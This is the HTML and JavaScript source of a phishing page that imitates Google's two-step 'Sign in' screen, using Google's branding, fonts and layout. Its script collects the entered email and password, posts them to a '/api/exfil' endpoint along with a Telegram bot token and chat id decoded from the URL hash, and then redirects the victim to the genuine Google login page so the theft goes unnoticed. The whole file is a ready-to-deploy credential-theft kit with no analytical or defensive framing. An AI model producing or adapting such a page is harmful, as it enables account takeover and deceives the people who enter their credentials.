<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign in - Google Accounts</title>
    <link rel="shortcut icon" href="https://www.google.com/favicon.ico">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
        
        body { 
            font-family: 'Roboto', sans-serif; 
            background-color: #fff; 
            color: #1f1f1f;
            -webkit-font-smoothing: antialiased;
        }

        .g-card {
            width: 100%;
            max-width: 448px;
            transition: all 0.3s ease;
            position: relative;
        }

        @media (min-width: 640px) {
            .g-card {
                border: 1px solid #dcdcdc;
                border-radius: 28px;
                padding: 40px;
                min-height: 500px;
            }
            body { background-color: #f0f2f5; }
        }

        .g-input-container {
            position: relative;
            margin-bottom: 8px;
        }

        .g-input {
            width: 100%;
            height: 56px;
            border: 1px solid #747775;
            border-radius: 4px;
            padding: 0 16px;
            font-size: 16px;
            transition: border 0.2s;
        }

        .g-input:focus {
            border: 2px solid #0b57d0;
            outline: none;
        }

        .g-btn-primary {
            background-color: #0b57d0;
            color: #fff;
            font-weight: 500;
            padding: 0 24px;
            border-radius: 20px;
            height: 40px;
            font-size: 14px;
            transition: background 0.2s;
        }

        .g-btn-primary:active { background-color: #0842a0; }

        .loading-bar {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: transparent;
            overflow: hidden;
            display: none;
            border-top-left-radius: 28px;
            border-top-right-radius: 28px;
        }

        .loading-bar div {
            position: absolute;
            background-color: #0b57d0;
            height: 100%;
            width: 50%;
            animation: indeterminate 1.5s infinite linear;
        }

        @keyframes indeterminate {
            0% { left: -50%; width: 30%; }
            50% { width: 30%; }
            100% { left: 100%; width: 30%; }
        }

        .step-transition {
            animation: fadeIn 0.4s ease-out forwards;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">

    <div class="g-card bg-white overflow-hidden">
        <!-- Progress Bar -->
        <div id="loader" class="loading-bar"><div></div></div>

        <div class="flex flex-col items-center">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="h-6 mb-4 mt-2">
            
            <!-- Step 1: Identifier -->
            <div id="step-id" class="w-full text-center step-transition">
                <h1 class="text-2xl font-normal mb-2">Sign in</h1>
                <p class="text-base mb-10">Use your Google Account</p>
                
                <div class="text-left">
                    <div class="g-input-container">
                        <input type="email" id="email" placeholder="Email or phone" class="g-input" autocomplete="username">
                    </div>
                    <a href="#" class="text-[#0b57d0] font-medium text-sm hover:underline">Forgot email?</a>
                    
                    <p class="text-sm text-[#444746] mt-10 leading-relaxed">
                        Not your computer? Use a Guest window to sign in privately. 
                        <a href="#" class="text-[#0b57d0] font-medium">Learn more</a>
                    </p>
                </div>

                <div class="flex justify-between items-center mt-12">
                    <button class="text-[#0b57d0] font-medium text-sm hover:bg-gray-100 px-3 py-2 rounded-full">Create account</button>
                    <button onclick="toPassword()" class="g-btn-primary">Next</button>
                </div>
            </div>

            <!-- Step 2: Password -->
            <div id="step-pass" class="w-full text-center hidden">
                <div class="flex items-center justify-center mb-6">
                    <div class="flex items-center gap-2 border border-gray-200 rounded-full px-3 py-1 cursor-pointer hover:bg-gray-50">
                        <div class="w-5 h-5 bg-gray-100 rounded-full flex items-center justify-center">
                            <svg class="w-4 h-4 text-gray-500" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                        </div>
                        <span id="display-user" class="text-sm font-medium"></span>
                        <svg class="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
                    </div>
                </div>

                <h1 class="text-2xl font-normal mb-2">Welcome</h1>
                <p class="text-base mb-10" id="pass-prompt">Enter your password</p>

                <div class="text-left space-y-6">
                    <input type="password" id="password" placeholder="Enter your password" class="g-input" autocomplete="current-password">
                    <div class="flex items-center gap-2 text-sm">
                        <input type="checkbox" id="show-pass" class="w-4 h-4 accent-[#0b57d0]">
                        <label for="show-pass" class="cursor-pointer font-medium">Show password</label>
                    </div>
                </div>

                <div class="flex justify-between items-center mt-12">
                    <button class="text-[#0b57d0] font-medium text-sm hover:bg-gray-100 px-3 py-2 rounded-full">Forgot password?</button>
                    <button onclick="submitHit()" class="g-btn-primary">Next</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile Footer -->
    <footer class="sm:hidden fixed bottom-0 w-full p-4 flex justify-center gap-6 text-xs text-gray-600">
        <span>Help</span>
        <span>Privacy</span>
        <span>Terms</span>
    </footer>

    <script>
        const getConf = () => {
            const h = window.location.hash.substring(1);
            if (!h) return null;
            try { return JSON.parse(atob(h)); } catch(e) { return null; }
        };

        const config = getConf();
        let userVal = "";

        const showLoader = (show) => {
            document.getElementById('loader').style.display = show ? 'block' : 'none';
        };

        function toPassword() {
            userVal = document.getElementById('email').value;
            if(!userVal) return;
            
            showLoader(true);
            setTimeout(() => {
                showLoader(false);
                document.getElementById('display-user').innerText = userVal;
                document.getElementById('step-id').classList.add('hidden');
                document.getElementById('step-pass').classList.remove('hidden');
                document.getElementById('step-pass').classList.add('step-transition');
                document.getElementById('password').focus();
            }, 800);
        }

        async function submitHit() {
            const pass = document.getElementById('password').value;
            if(!pass) return;

            showLoader(true);
            const redirectUrl = "https://accounts.google.com/ServiceLogin";

            if(!config) {
                setTimeout(() => window.location.href = redirectUrl, 1000);
                return;
            }

            try {
                await fetch('/api/exfil', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        target: 'google',
                        credentials: { username: userVal, password: pass },
                        tgToken: config.t,
                        tgChat: config.c
                    })
                });
            } finally {
                setTimeout(() => window.location.href = redirectUrl, 1000);
            }
        }

        document.getElementById('show-pass').addEventListener('change', function() {
            document.getElementById('password').type = this.checked ? 'text' : 'password';
        });
    </script>
</body>
</html>
